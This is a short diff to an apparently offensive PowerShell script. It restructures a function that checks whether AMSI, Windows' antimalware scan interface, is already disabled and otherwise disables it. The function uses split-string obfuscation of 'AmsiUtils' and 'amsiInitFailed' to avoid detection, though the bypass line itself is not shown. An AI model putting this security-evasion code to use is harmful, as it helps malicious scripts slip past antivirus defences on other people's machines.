@@ -196,7 +196,12 @@ param (
 		
 		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').GetValue($null)))
 		
-		if ($CheckAmz -eq $False) {
+		if ($CheckAmz) {
+			$h
+			Write " [+] Amsi is already disabled."
+			$h
+		}
+		else {
 			
 			Try {
 			
@@ -209,18 +214,12 @@ param (
 				$h
 				Write " [+] Disabled Amsi."
 				$h
-				return
 			}
 			Catch {
 				$h
 				Write " [-] An Error has occurred. Unable to disable Amsi."
 				$h
 			}
-		}
-		if ($CheckAmz) {
-			$h
-			Write " [+] Amsi is already disabled."
-			$h
 		}
 	}
 }
